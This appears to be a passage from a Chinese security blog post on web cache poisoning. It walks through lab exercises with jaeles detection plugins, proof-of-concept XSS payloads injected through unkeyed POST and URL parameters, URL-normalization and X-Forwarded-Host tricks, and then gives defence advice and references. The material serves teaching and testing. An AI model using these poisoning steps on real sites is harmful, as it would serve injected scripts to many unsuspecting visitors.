class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">4445</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="3-8-畸形请求导致投毒"><a href="#3-8-畸形请求导致投毒" class="headerlink" title="3.8 畸形请求导致投毒"></a>3.8 畸形请求导致投毒</h3><p>本实验是通过不规范的HTTP请求导致的投毒攻击，首先查看主页，其中callback函数是需要注意的问题，</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222141653763.png" alt="image-20210222141653763"></p>
+<p>单独访问<code>js/geolocate.js?callback=setCountryCookie</code>，修改callback的值，返回内容也会改变。但是callback的值是cache key。没有办法利用。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222142043129.png" alt="image-20210222142043129"></p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222142632400.png" alt="image-20210222142632400"></p>
+<p>返回内容如下，</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const setCountryCookie = <span class="function"><span class="params">(country)</span> =&gt;</span> &#123; <span class="built_in">document</span>.cookie = <span class="string">&#x27;country=&#x27;</span> + country; &#125;;</span><br><span class="line">const setLangCookie = <span class="function"><span class="params">(lang)</span> =&gt;</span> &#123; <span class="built_in">document</span>.cookie = <span class="string">&#x27;lang=&#x27;</span> + lang; &#125;;</span><br><span class="line">setCountryCookie(&#123;<span class="string">&quot;country&quot;</span>:<span class="string">&quot;United Kingdom&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>&lt;script type=&quot;text/javascript&quot; src=&quot;/js/geolocate.js?callback=setCountryCookie&quot;&gt;&lt;/script&gt;</code></p>
+<p>会拿回: <code>setCountryCookie(&#123;&quot;country&quot;:&quot;United Kingdom&quot;&#125;);</code></p>
+<p>最终成为:</p>
+<p><code>&lt;script type=&quot;text/javascript&quot;&gt;setCountryCookie(&#123;&quot;country&quot;:&quot;United Kingdom&quot;&#125;);&lt;/script&gt;</code></p>
+<p>但是如果不放弃，深入测试就会发现。虽然在get请求是cache key，但是在post里添加相同的参数却是unkeyed。构造payload: <code>callback=alert(1)</code>，重复请求直到命中缓存。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222145309155.png" alt="image-20210222145309155"></p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222144410773.png" alt="image-20210222144410773"></p>
+<h3 id="3-9-通过url参数投毒"><a href="#3-9-通过url参数投毒" class="headerlink" title="3.9 通过url参数投毒"></a>3.9 通过url参数投毒</h3><p>本实验中url参数是unkeyed。编写一个get请求的插件，随意添加几个参数，如果添加的参数值回显在响应中，那么就手工测试是否能够进一步利用。</p>
+<p>jaeles插件代码如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">simple-add-getquery-reflect</span></span><br><span class="line"><span class="attr">level:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">simple</span> </span><br><span class="line">  <span class="attr">risk:</span> <span class="string">low</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">root:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.BaseURL&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">vars:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      test</span></span><br><span class="line"><span class="string">      utm%5fcontent</span></span><br><span class="line"><span class="string">      redirect</span></span><br><span class="line"><span class="string">      url</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">check:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      saddgetqueryreflect</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">redirect:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">headers:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="number">10.15</span><span class="string">;</span> <span class="string">rv:85.0)</span> <span class="string">Gecko/20100101</span> <span class="string">Firefox/85.0</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      &#123;&#123;.root&#125;&#125;/?&#123;&#123;.vars&#125;&#125;=&#123;&#123;.check&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    </span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StringSearch(&quot;response&quot;,</span> <span class="string">&quot;saddgetqueryreflect&quot;</span><span class="string">)</span></span><br></pre></td></tr></table></figure>
+
+<p>插件逻辑很简单，就是在URL后面跟几个参数，看看参数的值是否会出现在response中。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204100506511.png" alt="image-20210204100506511"></p>
+<p>通过插件确实能检测到，现在我们手工验证一下，确实有回显。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204100805897.png" alt="image-20210204100805897"></p>
+<p>接下来将unkeyed参数注入到缓存，然后去掉unkeyed参数，检测是否还能收到带有unkey参数的响应。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204105734286.png" alt="image-20210204105734286"></p>
+<p>去掉之后任然收到了带有unkey参数的响应，那么接下来就是如何来恶意利用。</p>
+<p>首先还是来进行xss payload注入。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204110117141.png" alt="image-20210204110117141"></p>
+<p>访问会自动加上xss payload</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204110226548.png" alt="image-20210204110226548"></p>
+<h3 id="3-10-利用缓存绕过编码限制-URL-normalization"><a href="#3-10-利用缓存绕过编码限制-URL-normalization" class="headerlink" title="3.10 利用缓存绕过编码限制(URL normalization)"></a>3.10 利用缓存绕过编码限制(<strong>URL normalization</strong>)</h3><p>用一个检查路径回显的插件检测到了路径回显问题，插件如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">path-reflect</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">path</span> <span class="string">reflect</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">RandomString(6)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">root:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.BaseURL&#125;&#125;</span>&#x27;</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      &#123;&#123;.root&#125;&#125;/&#123;&#123;.ran&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">headers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">User-Agent:</span> <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55&#x27;</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        StringSearch(&quot;response&quot;, &quot;&#123;&#123;.ran&#125;&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>手工探测也发现了该问题，</p>
+<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207111457635.png" alt="image-20210207111457635"></p>
+<p>既然有回显，肯定试一下XSS攻击。插入payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现返回结果是编码后的结果。多次请求，命中缓存还是编码后的结果。由于发送请求时候浏览器会自动加一层URL编码</p>
+<p>是没办法直接进行XSS攻击的。</p>
+<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207111614903.png" alt="image-20210207111614903"></p>
+<p>转换一下思路，存在缓存，那如果我们把为未编码的payload插入缓存，那么我们请求缓存未编码的payload。就能触发payload。</p>
+<ol>
+<li><p>通过BurpSuite将未编码的 payload注入缓存。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207131145356.png" alt="image-20210207131145356"></p>
+</li>
+</ol>
+<p>2 . 再在浏览器中请求地址，成功触发payload。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207131104220.png" alt="image-20210207131104220"></p>
+<h3 id="3-11-内部缓存中毒"><a href="#3-11-内部缓存中毒" class="headerlink" title="3.11 内部缓存中毒"></a>3.11 内部缓存中毒</h3><p>打开实验环境，通过拦截数据包，发现似乎没有缓存。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216090500297.png" alt="image-20210216090500297"></p>
+<p>通过之前编写的插件检测，发现参数污染 x-forwarded-host头等回显问题。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216090542129.png" alt="image-20210216090542129"></p>
+<p>本例中我们显然要找到缓存的地方才行。通过添加x-forwarded-host头。X-Forwarded-Host: your-exploit-server</p>
+<p>在自己的服务器上观察收到的请求，发现有三处请求，并且响应包中也有三处回显，其中geolocate.js的请求在我们删除X-Forwarded-Host头后还是会请求，说明这种是缓存在内部，我们通过在自己的服务器上构造利用payload，就可以利用该漏洞。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216091300459.png" alt="image-20210216091300459"></p>
+<h2 id="4-防御"><a href="#4-防御" class="headerlink" title="4. 防御"></a>4. 防御</h2><ul>
+<li><p>终极方案就是关闭缓存，但对很多网站来说并不现实，实际可能需要变通。比如你使用缓存仅仅是因为CDN默认就是开着的，这时候可以考虑是否真的需要这个功能。</p>
+</li>
+<li><p>就算是真的需要使用缓存，也要限制在静态资源上，在后端服务器做好检测，避免将恶意内容返回给缓存。</p>
+</li>
+<li><p>如果使用外部供应商的缓存，不仅要修改默认配置，还要查看CDN支持那些请求头，因为很多web缓存投毒攻击都是出现在一些不常用的请求头上。</p>
+</li>
+</ul>
+<p>在使用缓存时，你应该采用如下的一些防御方案</p>
+<ul>
+<li>如果出于性能考虑不使用某些缓存键，就重写请求，不要直接配置，这样很容易导致unkeyed。</li>
+<li>不要接受畸形HTTP请求，使用的某些外部供应商的技术可能默认支持各种不规范的HTTP请求。</li>
+<li>不要忽视客户端漏洞，因为客户端漏洞结合缓存会变成威力巨大的漏洞。</li>
+</ul>
+<h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h2><ul>
+<li> black hat议题白皮书：<a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning-wp.pdf">https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning-wp.pdf</a></li>
+<li> black hat议题ppt:<a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning.pdf">https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning.pdf</a></li>
+<li> <a target="_blank" rel="noopener" href="https://portswigger.net/research/practical-web-cache-poisoning">https://portswigger.net/research/practical-web-cache-poisoning</a></li>
+<li> <a target="_blank" rel="noopener" href="https://ph4ntonn.github.io/Web-Cache-Poisoning.html">https://ph4ntonn.github.io/Web-Cache-Poisoning.html</a></li>
+<li> <a target="_blank" rel="noopener" href="https://medium.com/@m01e/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-%E6%9C%AA%E5%AE%8C%E6%88%90%E7%89%88-4e5a1cfd2c58">https://medium.com/@m01e/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-%E6%9C%AA%E5%AE%8C%E6%88%90%E7%89%88-4e5a1cfd2c58</a></li>
+<li> <a target="_blank" rel="noopener" href="https://www.4hou.com/posts/RwoL">https://www.4hou.com/posts/RwoL</a></li>
+<li> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ</a></li>
+<li> <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000009638800">https://segmentfault.com/a/1190000009638800</a></li>
+<li> <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000021060741">https://segmentfault.com/a/1190000021060741</a></li>
+<li> <a target="_blank" rel="noopener" href="https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning">https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning</a></li>
+<li> <a target="_blank" rel="noopener" href="https://cpdos.org/">https://cpdos.org/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag"># web漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A01-Social%20Network/" rel="prev" title="打靶练习1-Social Network">
+      <i class="fa fa-chevron-left"></i> 打靶练习1-Social Network
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" rel="next" title="linux进程注入">
+      linux进程注入 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-text">1. 基础概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-web-%E7%BC%93%E5%AD%98"><span class="nav-text">1.1 web 缓存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E4%B8%8D%E5%90%8C%E7%A7%8D%E7%B1%BB%E7%9A%84%E7%BC%93%E5%AD%98"><span class="nav-text">1.2 不同种类的缓存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-HTTP%E5%8D%8F%E8%AE%AE%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6web%E7%BC%93%E5%AD%98"><span class="nav-text">1.3 HTTP协议如何控制web缓存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%BC%BA%E5%88%B6%E7%BC%93%E5%AD%98"><span class="nav-text">1. 强制缓存</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98"><span class="nav-text">2. 协商缓存</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-cache-key"><span class="nav-text">1.4 cache key</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-unkeyed"><span class="nav-text">1.5 unkeyed</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"><span class="nav-text">1.6 缓存投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="nav-text">1.7 缓存投毒的影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-8-%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="nav-text">1.8 如何进行一个缓存投毒漏洞的挖掘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E4%B8%8D%E5%90%8C%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-text">2. 不同的攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-redhat%E7%9A%84%E4%B8%80%E4%B8%AA%E6%8A%95%E6%AF%92%E6%A1%88%E4%BE%8B"><span class="nav-text">2.1 redhat的一个投毒案例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%8A%95%E6%AF%92%E6%97%B6%E6%9C%BA"><span class="nav-text">2.2 投毒时机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E9%80%89%E6%8B%A9%E6%80%A7%E6%8A%95%E6%AF%92"><span class="nav-text">2.3 选择性投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-DOM%E6%8A%95%E6%AF%92"><span class="nav-text">2.4 DOM投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-%E5%8A%AB%E6%8C%81-Mozilla-SHIELD%E7%B3%BB%E7%BB%9F"><span class="nav-text">2.5 劫持 Mozilla SHIELD系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-CPDOS"><span class="nav-text">2.6 CPDOS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E7%A7%8D%E4%B8%8D%E5%90%8C%E7%9A%84CPDOS"><span class="nav-text">三种不同的CPDOS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E6%96%AF%E6%8B%89%E7%9A%84%E4%B8%80%E4%B8%AA%E7%BC%93%E5%AD%98DOS%E6%BC%8F%E6%B4%9E"><span class="nav-text">特斯拉的一个缓存DOS漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E9%9D%B6%E5%9C%BA"><span class="nav-text">3. 靶场</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E7%BC%93%E5%AD%98%E5%88%A4%E6%96%AD%E6%8F%92%E4%BB%B6"><span class="nav-text">3.1 缓存判断插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Param-Miner%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">3.2 Param Miner的使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-X-Forwarded-Host-%E6%8A%95%E6%AF%92"><span class="nav-text">3.3 X-Forwarded-Host 投毒</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E8%AE%A4unkeyed"><span class="nav-text">确认unkeyed</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0payload"><span class="nav-text">构造payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-Cookie%E6%8A%95%E6%AF%92"><span class="nav-text">3.4 Cookie投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-%E5%A4%9A%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%9A%84%E6%8A%95%E6%AF%92"><span class="nav-text">3.5 多个请求头的投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-%E7%8C%9C%E6%B5%8B%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%8A%95%E6%AF%92"><span class="nav-text">3.6 猜测请求头投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-7-DOM%E6%8A%95%E6%AF%92"><span class="nav-text">3.7 DOM投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-8-%E7%95%B8%E5%BD%A2%E8%AF%B7%E6%B1%82%E5%AF%BC%E8%87%B4%E6%8A%95%E6%AF%92"><span class="nav-text">3.8 畸形请求导致投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-9-%E9%80%9A%E8%BF%87url%E5%8F%82%E6%95%B0%E6%8A%95%E6%AF%92"><span class="nav-text">3.9 通过url参数投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-10-%E5%88%A9%E7%94%A8%E7%BC%93%E5%AD%98%E7%BB%95%E8%BF%87%E7%BC%96%E7%A0%81%E9%99%90%E5%88%B6-URL-normalization"><span class="nav-text">3.10 利用缓存绕过编码限制(URL normalization)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-11-%E5%86%85%E9%83%A8%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="nav-text">3.11 内部缓存中毒</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E9%98%B2%E5%BE%A1"><span class="nav-text">4. 防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E5%8F%82%E8%80%83"><span class="nav-text">5. 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Vinci"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">Vinci</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/vinci-3000" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;vinci-3000" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Vinci_YNM3000" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Vinci_YNM3000" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Vinci</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
